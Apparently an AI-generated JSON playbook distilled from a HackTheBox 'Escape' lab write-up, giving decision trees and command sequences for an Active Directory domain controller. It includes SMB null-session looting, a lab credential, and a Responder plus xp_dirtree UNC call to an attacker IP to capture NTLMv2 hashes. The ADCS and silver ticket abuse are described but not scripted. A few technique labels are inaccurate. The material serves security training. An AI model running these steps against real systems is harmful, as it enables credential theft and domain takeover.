@@ -1,0 +1,883 @@
+{
+  "writeup_id": "Htb_Escape",
+  "scenario_fingerprint": {
+    "scenario_name": "windows_domain_controller_mssql_adcs",
+    "primary_services": [
+      "mssql",
+      "ldap",
+      "kerberos",
+      "smb",
+      "dns"
+    ],
+    "port_signature": "53+88+389+445+1433",
+    "service_combination": "dns+kerberos+ldap+smb+mssql",
+    "os_family": "windows_server",
+    "environment_type": "active_directory",
+    "entry_vector": "smb_share_credential_disclosure",
+    "privilege_path": "mssql_xp_dirtree_to_adcs_esc1",
+    "attack_complexity": "medium",
+    "estimated_time": "60-90 minutes",
+    "scenario_confidence": 0.92,
+    "distinguishing_factors": [
+      "mssql_on_domain_controller",
+      "adcs_certificate_authority",
+      "xp_dirtree_ntlm_relay",
+      "log_file_credential_exposure"
+    ],
+    "environmental_clues": [
+      "domain_controller_role",
+      "mssql_server_integration",
+      "certificate_services_installed",
+      "sequel-dc-ca_authority"
+    ],
+    "similar_scenarios": [
+      "sequel_htb_medium",
+      "intelligence_htb_medium"
+    ],
+    "unique_aspects": [
+      "mssql_xp_dirtree_technique",
+      "adcs_certificate_template_abuse",
+      "sql_service_account_compromise"
+    ]
+  },
+  "success_patterns": {
+    "success_factors": [
+      {
+        "technique": "SMB_null_authentication",
+        "success_reason": "SMB server allowed null authentication with any username",
+        "prerequisite_indicators": [
+          "smb_service_available",
+          "null_session_enabled",
+          "guest_access_permitted"
+        ],
+        "recognition_patterns": [
+          "crackmapexec fails without username",
+          "succeeds with any username + empty password",
+          "Public share accessible"
+        ],
+        "failure_modes": [
+          "null_sessions_disabled",
+          "guest_access_blocked",
+          "smb_signing_required"
+        ],
+        "environmental_factors": [
+          "default_windows_smb_config",
+          "legacy_compatibility_settings",
+          "insufficient_access_controls"
+        ],
+        "success_probability": 0.65,
+        "typical_timeframe": "2-5 minutes"
+      },
+      {
+        "technique": "MSSQL_xp_dirtree_hash_capture",
+        "success_reason": "MSSQL server allowed xp_dirtree to trigger SMB authentication",
+        "prerequisite_indicators": [
+          "mssql_service_accessible",
+          "xp_dirtree_enabled",
+          "smb_responder_available"
+        ],
+        "recognition_patterns": [
+          "SQL Server 15.00.2000.00 identified",
+          "guest login enabled",
+          "extended procedures available"
+        ],
+        "failure_modes": [
+          "xp_dirtree_disabled",
+          "guest_access_blocked",
+          "network_isolation"
+        ],
+        "environmental_factors": [
+          "default_mssql_configuration",
+          "extended_procedures_enabled",
+          "network_connectivity_allowed"
+        ],
+        "success_probability": 0.78,
+        "typical_timeframe": "10-20 minutes"
+      },
+      {
+        "technique": "ADCS_certificate_template_abuse",
+        "success_reason": "Certificate template allowed user authentication with vulnerable settings",
+        "prerequisite_indicators": [
+          "adcs_service_available",
+          "certificate_templates_enumerable",
+          "vulnerable_template_exists"
+        ],
+        "recognition_patterns": [
+          "sequel-DC-CA certificate authority",
+          "certificate templates with user authentication",
+          "insufficient template restrictions"
+        ],
+        "failure_modes": [
+          "templates_properly_configured",
+          "certificate_enrollment_restricted",
+          "adcs_not_available"
+        ],
+        "environmental_factors": [
+          "active_directory_certificate_services",
+          "default_template_configurations",
+          "insufficient_template_hardening"
+        ],
+        "success_probability": 0.82,
+        "typical_timeframe": "15-30 minutes"
+      }
+    ],
+    "critical_discoveries": [
+      {
+        "discovery": "MSSQL credentials in Public share",
+        "discovery_method": "SMB null authentication enumeration",
+        "why_critical": "Provided initial database access for hash capture attack",
+        "how_to_recognize": [
+          "configuration files in public shares",
+          "database connection strings",
+          "service account credentials"
+        ],
+        "follow_up_actions": [
+          "test_mssql_authentication",
+          "enumerate_database_permissions",
+          "attempt_xp_dirtree_attack"
+        ]
+      },
+      {
+        "discovery": "sql_svc service account",
+        "discovery_method": "xp_dirtree SMB hash capture and cracking",
+        "why_critical": "Service account with access to application logs containing user credentials",
+        "how_to_recognize": [
+          "service account naming pattern (sql_*)",
+          "Net-NTLMv2 hash capture success",
+          "weak password patterns"
+        ],
+        "follow_up_actions": [
+          "crack_hash_with_hashcat",
+          "test_winrm_access",
+          "enumerate_file_system_access"
+        ]
+      },
+      {
+        "discovery": "ADCS certificate authority",
+        "discovery_method": "TLS certificate analysis and service enumeration",
+        "why_critical": "Vulnerable certificate templates leading to domain admin",
+        "how_to_recognize": [
+          "sequel-DC-CA in certificate issuer",
+          "certificate services ports available",
+          "vulnerable template configurations"
+        ],
+        "follow_up_actions": [
+          "enumerate_certificate_templates",
+          "test_certificate_enrollment",
+          "abuse_vulnerable_templates"
+        ]
+      }
+    ],
+    "escalation_keys": [
+      {
+        "privilege_level": "guest_database_access",
+        "escalation_method": "xp_dirtree_to_service_account",
+        "why_possible": "MSSQL allowed extended procedures and SMB authentication capture",
+        "recognition_signs": [
+          "xp_dirtree_procedure_available",
+          "guest_database_access",
+          "smb_authentication_capture_possible"
+        ],
+        "exploitation_path": "Guest DB → xp_dirtree → Hash Capture → sql_svc"
+      },
+      {
+        "privilege_level": "service_account",
+        "escalation_method": "log_file_credential_extraction",
+        "why_possible": "Service account had read access to application logs with user credentials",
+        "recognition_signs": [
+          "service_account_file_access",
+          "application_logs_accessible",
+          "credentials_in_log_files"
+        ],
+        "exploitation_path": "sql_svc → Log Files → User Credentials → WinRM Access"
+      },
+      {
+        "privilege_level": "domain_user",
+        "escalation_method": "ADCS_certificate_template_abuse",
+        "why_possible": "Certificate templates allowed user authentication without proper restrictions",
+        "recognition_signs": [
+          "adcs_service_available",
+          "vulnerable_certificate_templates",
+          "certificate_enrollment_permitted"
+        ],
+        "exploitation_path": "Domain User → Certificate Enrollment → Administrator Certificate → Domain Admin"
+      }
+    ]
+  },
+  "decision_tree": {
+    "decision_points": [
+      {
+        "step": 1,
+        "situation": "Found ports 53,88,135,139,389,445,464,593,636,1433,3268,3269,5985 open on Windows host",
+        "decision": "Identify as Domain Controller with MSSQL and prioritize SMB enumeration first",
+        "reasoning": "Port combination indicates AD DC with MSSQL server - SMB often has accessible shares with credentials",
+        "confidence": 0.95,
+        "alternatives": [
+          {
+            "option": "kerberos_enumeration",
+            "when": "if smb fails"
+          },
+          {
+            "option": "ldap_enumeration",
+            "when": "if anonymous access available"
+          },
+          {
+            "option": "mssql_default_creds",
+            "when": "if no other access found"
+          }
+        ],
+        "success_indicators": [
+          "smb_shares_accessible",
+          "domain_name_discovered",
+          "certificate_authority_identified"
+        ],
+        "next_decision": "enumerate_accessible_smb_shares"
+      },
+      {
+        "step": 2,
+        "situation": "Found accessible SMB Public share with SQL Server documentation",
+        "decision": "Extract credentials from documentation and test MSSQL access",
+        "reasoning": "Documentation often contains default/service credentials for initial access",
+        "confidence": 0.9,
+        "prerequisites": [
+          "smb_read_access",
+          "documentation_files_found"
+        ],
+        "success_indicators": [
+          "mssql_credentials_found",
+          "database_connection_successful"
+        ],
+        "failure_fallbacks": [
+          "ldap_enumeration",
+          "kerberos_attacks",
+          "certificate_services_enum"
+        ]
+      },
+      {
+        "step": 3,
+        "situation": "Obtained MSSQL access with PublicUser credentials",
+        "decision": "Use xp_dirtree to capture Net-NTLMv2 hash via UNC path",
+        "reasoning": "MSSQL xp_dirtree can force authentication to attacker-controlled SMB server",
+        "confidence": 0.85,
+        "prerequisites": [
+          "mssql_access",
+          "xp_dirtree_available"
+        ],
+        "success_indicators": [
+          "ntlmv2_hash_captured",
+          "service_account_identified"
+        ],
+        "failure_fallbacks": [
+          "database_enumeration",
+          "xp_cmdshell_attempt",
+          "linked_servers_check"
+        ]
+      }
+    ],
+    "branching_logic": {
+      "if_smb_accessible": {
+        "action": "enumerate_shares_and_extract_files",
+        "tools": [
+          "crackmapexec",
+          "smbclient"
+        ],
+        "next_phase": "credential_extraction_from_documents"
+      },
+      "if_mssql_creds_found": {
+        "action": "connect_and_attempt_hash_capture",
+        "tools": [
+          "mssqlclient.py",
+          "responder",
+          "xp_dirtree"
+        ],
+        "next_phase": "hash_cracking_and_authentication"
+      },
+      "if_ntlmv2_captured": {
+        "action": "crack_hash_and_authenticate",
+        "tools": [
+          "hashcat",
+          "evil-winrm"
+        ],
+        "next_phase": "privilege_escalation_enumeration"
+      },
+      "if_service_account_access": {
+        "action": "enumerate_logs_and_certificate_services",
+        "purpose": "find_additional_credentials_and_adcs_vulnerabilities",
+        "tools": [
+          "certify",
+          "certipy",
+          "bloodhound"
+        ]
+      }
+    },
+    "optimization_rules": [
+      {
+        "rule": "always_check_smb_shares_first_on_windows_dc",
+        "reasoning": "high_probability_of_accessible_documentation_with_credentials",
+        "applicability": "windows_domain_controller_environments"
+      },
+      {
+        "rule": "use_xp_dirtree_for_hash_capture_when_mssql_access_obtained",
+        "reasoning": "reliable_method_for_service_account_credential_extraction",
+        "applicability": "mssql_server_access_available"
+      },
+      {
+        "rule": "enumerate_adcs_when_certificate_authority_identified",
+        "reasoning": "adcs_often_misconfigured_for_privilege_escalation",
+        "applicability": "active_directory_certificate_services_present"
+      }
+    ]
+  },
+  "applicability_rules": {
+    "technique_rules": [
+      {
+        "technique": "SMB Anonymous Enumeration",
+        "mitre_id": "T1135",
+        "required_services": [
+          "smb"
+        ],
+        "required_ports": [
+          445,
+          139
+        ],
+        "os_requirements": [
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "smb_service_accessible",
+          "anonymous_access_enabled"
+        ],
+        "success_indicators": [
+          "shares_enumerated",
+          "files_accessible",
+          "credentials_found_in_files"
+        ],
+        "incompatible_with": [
+          "smb_signing_required",
+          "anonymous_access_disabled",
+          "network_isolation"
+        ],
+        "confidence_boosters": [
+          "default_windows_configuration",
+          "legacy_smb_versions",
+          "development_environments"
+        ],
+        "typical_success_rate": 0.75,
+        "estimated_time": "5-10 minutes"
+      },
+      {
+        "technique": "MSSQL xp_dirtree NTLM Capture",
+        "mitre_id": "T1187",
+        "required_services": [
+          "mssql"
+        ],
+        "required_ports": [
+          1433
+        ],
+        "os_requirements": [
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "mssql_server_accessible",
+          "valid_mssql_credentials",
+          "xp_dirtree_enabled"
+        ],
+        "success_indicators": [
+          "ntlm_hash_captured",
+          "service_account_context",
+          "network_authentication_forced"
+        ],
+        "incompatible_with": [
+          "xp_cmdshell_disabled",
+          "service_isolation",
+          "credential_guard_enabled"
+        ],
+        "confidence_boosters": [
+          "service_account_running_mssql",
+          "default_mssql_configuration",
+          "domain_joined_server"
+        ],
+        "typical_success_rate": 0.85,
+        "estimated_time": "10-20 minutes"
+      },
+      {
+        "technique": "ADCS Certificate Template Abuse",
+        "mitre_id": "T1649",
+        "required_services": [
+          "adcs"
+        ],
+        "required_ports": [
+          135,
+          445
+        ],
+        "os_requirements": [
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "active_directory_certificate_services",
+          "vulnerable_certificate_templates",
+          "domain_user_access"
+        ],
+        "success_indicators": [
+          "certificate_requested_successfully",
+          "authentication_with_certificate",
+          "privilege_escalation_achieved"
+        ],
+        "incompatible_with": [
+          "certificate_templates_hardened",
+          "adcs_not_installed",
+          "certificate_approval_required"
+        ],
+        "confidence_boosters": [
+          "default_adcs_templates",
+          "legacy_certificate_configurations",
+          "ca_certificate_detected"
+        ],
+        "typical_success_rate": 0.7,
+        "estimated_time": "15-30 minutes"
+      },
+      {
+        "technique": "Silver Ticket Attack",
+        "mitre_id": "T1558.002",
+        "required_services": [
+          "kerberos"
+        ],
+        "required_ports": [
+          88
+        ],
+        "os_requirements": [
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "service_account_credentials",
+          "service_spn_identified",
+          "kerberos_authentication"
+        ],
+        "success_indicators": [
+          "service_ticket_forged",
+          "service_access_granted",
+          "authentication_bypassed"
+        ],
+        "incompatible_with": [
+          "kerberos_disabled",
+          "service_account_password_changed",
+          "pac_validation_enforced"
+        ],
+        "confidence_boosters": [
+          "mssql_service_account",
+          "known_service_credentials",
+          "domain_controller_accessible"
+        ],
+        "typical_success_rate": 0.8,
+        "estimated_time": "20-40 minutes"
+      }
+    ],
+    "environmental_detectors": {
+      "active_directory": {
+        "port_indicators": [
+          53,
+          88,
+          389,
+          445,
+          3268,
+          3269,
+          636
+        ],
+        "service_indicators": [
+          "kerberos",
+          "ldap",
+          "smb",
+          "dns"
+        ],
+        "banner_indicators": [
+          "Active Directory",
+          "Windows Server",
+          "Microsoft Windows Kerberos"
+        ],
+        "confidence_threshold": 0.95
+      },
+      "mssql_server": {
+        "port_indicators": [
+          1433
+        ],
+        "service_indicators": [
+          "ms-sql-s"
+        ],
+        "banner_indicators": [
+          "Microsoft SQL Server"
+        ],
+        "confidence_threshold": 0.9
+      },
+      "certificate_services": {
+        "port_indicators": [
+          135,
+          445
+        ],
+        "service_indicators": [
+          "msrpc",
+          "microsoft-ds"
+        ],
+        "banner_indicators": [
+          "sequel-DC-CA",
+          "Certificate Authority"
+        ],
+        "confidence_threshold": 0.85
+      },
+      "windows_domain_controller": {
+        "port_indicators": [
+          53,
+          88,
+          135,
+          389,
+          445,
+          464,
+          636,
+          3268,
+          3269,
+          5985
+        ],
+        "service_indicators": [
+          "domain",
+          "kerberos-sec",
+          "ldap",
+          "microsoft-ds"
+        ],
+        "banner_indicators": [
+          "dc.sequel.htb",
+          "Domain Controller"
+        ],
+        "confidence_threshold": 0.95
+      }
+    },
+    "attack_prioritization": {
+      "high_priority": [
+        {
+          "attack": "smb_anonymous_enumeration",
+          "when": "smb_service_detected",
+          "reason": "often_reveals_credentials_and_sensitive_files"
+        },
+        {
+          "attack": "mssql_credential_search",
+          "when": "mssql_and_smb_detected",
+          "reason": "credentials_commonly_stored_in_accessible_shares"
+        }
+      ],
+      "medium_priority": [
+        {
+          "attack": "mssql_xp_dirtree_ntlm_capture",
+          "when": "mssql_credentials_obtained",
+          "reason": "reliable_method_for_service_account_compromise"
+        },
+        {
+          "attack": "adcs_certificate_template_abuse",
+          "when": "certificate_authority_detected",
+          "reason": "powerful_privilege_escalation_vector"
+        }
+      ],
+      "low_priority": [
+        {
+          "attack": "silver_ticket_attack",
+          "when": "service_account_credentials_known",
+          "reason": "advanced_technique_requires_specific_prerequisites"
+        }
+      ]
+    }
+  },
+  "technique_intelligence": {
+    "techniques": [
+      {
+        "name": "MSSQL Net-NTLMv2 Hash Capture",
+        "mitre_id": "T1187",
+        "category": "credential_access",
+        "phase": "credential_access",
+        "tools_used": [
+          {
+            "name": "mssqlclient.py",
+            "command_template": "mssqlclient.py {domain}/{username}:{password}@{target}",
+            "actual_command": "mssqlclient.py sequel.htb/PublicUser:GuestUserCantWrite1@dc.sequel.htb",
+            "output_pattern": "SQL ({username}  guest@master)>",
+            "effectiveness_rating": 5,
+            "reliability": 0.95
+          },
+          {
+            "name": "Responder",
+            "command_template": "sudo python3 Responder.py -I {interface}",
+            "actual_command": "sudo python3 Responder.py -I tun0",
+            "success_factors": [
+              "smb_server_enabled",
+              "network_connectivity"
+            ],
+            "effectiveness_rating": 5
+          },
+          {
+            "name": "xp_dirtree",
+            "command_template": "EXEC xp_dirtree '\\\\{attacker_ip}\\{share}', 1, 1",
+            "actual_command": "EXEC xp_dirtree '\\\\10.10.14.6\\share', 1, 1",
+            "output_pattern": "subdirectory   depth   file",
+            "effectiveness_rating": 5,
+            "reliability": 0.98
+          }
+        ],
+        "prerequisites": [
+          "mssql_access_with_basic_permissions",
+          "network_connectivity_to_attacker",
+          "xp_dirtree_procedure_available"
+        ],
+        "success_indicators": [
+          "ntlmv2_hash_captured_in_responder",
+          "service_account_credentials_obtained",
+          "hash_format_valid_for_cracking"
+        ],
+        "common_failures": [
+          "xp_cmdshell_disabled_or_restricted",
+          "network_isolation_prevents_callback",
+          "insufficient_mssql_permissions"
+        ],
+        "follow_up_techniques": [
+          "ntlmv2_hash_cracking",
+          "credential_validation",
+          "privilege_escalation"
+        ],
+        "time_investment": "5-15 minutes",
+        "skill_level": "intermediate"
+      },
+      {
+        "name": "SMB Share Enumeration",
+        "mitre_id": "T1135",
+        "category": "discovery",
+        "phase": "discovery",
+        "tools_used": [
+          {
+            "name": "crackmapexec",
+            "command_template": "crackmapexec smb {target} -u {username} -p '{password}' --shares",
+            "actual_command": "crackmapexec smb 10.10.11.202 -u 0xdfnotreallyausername -p '' --shares",
+            "output_pattern": "[+] Enumerated shares",
+            "effectiveness_rating": 4,
+            "reliability": 0.9
+          },
+          {
+            "name": "smbclient",
+            "command_template": "smbclient //{target}/{share} -N",
+            "actual_command": "smbclient //10.10.11.202/Public -N",
+            "success_factors": [
+              "null_authentication_allowed",
+              "readable_shares_available"
+            ],
+            "effectiveness_rating": 4
+          }
+        ],
+        "prerequisites": [
+          "smb_service_accessible",
+          "null_authentication_or_guest_access"
+        ],
+        "success_indicators": [
+          "shares_enumerated_successfully",
+          "readable_content_discovered",
+          "credentials_or_sensitive_data_found"
+        ],
+        "common_failures": [
+          "authentication_required",
+          "no_interesting_shares_accessible",
+          "empty_or_restricted_shares"
+        ],
+        "follow_up_techniques": [
+          "file_content_analysis",
+          "credential_extraction",
+          "further_enumeration"
+        ],
+        "time_investment": "5-10 minutes",
+        "skill_level": "beginner"
+      }
+    ],
+    "tool_effectiveness": [
+      {
+        "tool": "Responder",
+        "use_case": "ntlmv2_hash_capture",
+        "effectiveness_rating": 5,
+        "reliability": 0.95,
+        "learning_curve": "low",
+        "essential_for": [
+          "credential_harvesting",
+          "ntlm_relay_attacks"
+        ],
+        "alternatives": [
+          "inveigh",
+          "ntlmrelayx"
+        ],
+        "best_practices": [
+          "run_as_root_for_privileged_ports",
+          "monitor_multiple_protocols_simultaneously",
+          "ensure_network_connectivity_to_targets"
+        ]
+      },
+      {
+        "tool": "mssqlclient.py",
+        "use_case": "mssql_server_interaction",
+        "effectiveness_rating": 5,
+        "reliability": 0.98,
+        "learning_curve": "low",
+        "essential_for": [
+          "mssql_exploitation",
+          "database_enumeration"
+        ],
+        "alternatives": [
+          "sqlcmd",
+          "dbeaver",
+          "custom_scripts"
+        ],
+        "best_practices": [
+          "test_xp_cmdshell_availability_first",
+          "use_xp_dirtree_for_hash_capture",
+          "enumerate_databases_and_permissions"
+        ]
+      }
+    ],
+    "command_sequences": [
+      {
+        "sequence_name": "mssql_hash_capture_workflow",
+        "steps": [
+          {
+            "step": 1,
+            "command": "sudo python3 Responder.py -I tun0",
+            "purpose": "Start hash capture listener",
+            "expected_output": "SMB server [ON]"
+          },
+          {
+            "step": 2,
+            "command": "mssqlclient.py sequel.htb/PublicUser:GuestUserCantWrite1@dc.sequel.htb",
+            "purpose": "Connect to MSSQL server",
+            "expected_output": "SQL (PublicUser  guest@master)>"
+          },
+          {
+            "step": 3,
+            "command": "EXEC xp_dirtree '\\\\10.10.14.6\\share', 1, 1",
+            "purpose": "Force authentication to capture hash",
+            "expected_output": "NTLMv2-SSP Hash captured in Responder"
+          }
+        ],
+        "success_rate": 0.92,
+        "typical_duration": "5-15 minutes"
+      },
+      {
+        "sequence_name": "smb_enumeration_workflow",
+        "steps": [
+          {
+            "step": 1,
+            "command": "crackmapexec smb 10.10.11.202 -u guest -p '' --shares",
+            "purpose": "Enumerate accessible SMB shares",
+            "expected_output": "List of available shares with permissions"
+          },
+          {
+            "step": 2,
+            "command": "smbclient //10.10.11.202/Public -N",
+            "purpose": "Access readable share",
+            "expected_output": "smb: \\> prompt"
+          },
+          {
+            "step": 3,
+            "command": "get \"SQL Server Procedures.pdf\"",
+            "purpose": "Download interesting files",
+            "expected_output": "File downloaded successfully"
+          }
+        ],
+        "success_rate": 0.85,
+        "typical_duration": "10-20 minutes"
+      }
+    ]
+  },
+  "metadata": {
+    "basic_metadata": {
+      "name": "Escape",
+      "difficulty": "Medium",
+      "os": "Windows",
+      "platform": "HackTheBox",
+      "release_date": "2023-02-25",
+      "author": "Geiseric",
+      "estimated_time": "90-120 minutes"
+    },
+    "intelligence_metadata": {
+      "attack_complexity": "medium",
+      "skill_level_required": "intermediate",
+      "primary_attack_vectors": [
+        "mssql",
+        "adcs",
+        "smb"
+      ],
+      "key_vulnerabilities": [
+        "credential_exposure",
+        "ntlm_relay",
+        "certificate_template_abuse"
+      ],
+      "environment_type": "corporate_domain_controller",
+      "real_world_relevance": "very_high",
+      "learning_value": [
+        "mssql_exploitation",
+        "adcs_attacks",
+        "certificate_abuse",
+        "ntlm_relay"
+      ],
+      "prerequisite_knowledge": [
+        "active_directory_basics",
+        "mssql_fundamentals",
+        "certificate_services"
+      ]
+    },
+    "categorization": {
+      "primary_category": "active_directory",
+      "subcategories": [
+        "certificate_services",
+        "mssql_exploitation",
+        "credential_access"
+      ],
+      "attack_types": [
+        "credential_access",
+        "privilege_escalation",
+        "lateral_movement"
+      ],
+      "defensive_lessons": [
+        "secure_certificate_templates",
+        "mssql_hardening",
+        "credential_protection",
+        "log_monitoring"
+      ]
+    },
+    "similarity_markers": {
+      "similar_boxes": [
+        "Authority",
+        "Manager",
+        "Outdated"
+      ],
+      "similarity_reasons": [
+        "adcs_exploitation",
+        "certificate_abuse",
+        "mssql_services",
+        "domain_controller"
+      ],
+      "unique_aspects": [
+        "xp_dirtree_ntlm_capture",
+        "log_credential_extraction",
+        "silver_ticket_alternative"
+      ],
+      "difficulty_factors": [
+        "multiple_attack_vectors",
+        "certificate_template_analysis",
+        "log_analysis_required"
+      ]
+    }
+  },
+  "extraction_metadata": {
+    "parse_date": "2025-07-04T12:02:19.739911",
+    "original_file": "0xdf_writeups/Htb Escape.md",
+    "content_length": 45753,
+    "extraction_version": "2.0-claude",
+    "model_used": "claude-sonnet-4-20250514"
+  },
+  "intelligence_confidence": 1.0,
+  "quality_breakdown": {
+    "scenario_uniqueness": 1.0,
+    "success_logic_clarity": 1.0,
+    "applicability_completeness": 1.0,
+    "decision_tree_depth": 1.0,
+    "technique_actionability": 1.0
+  }
+}
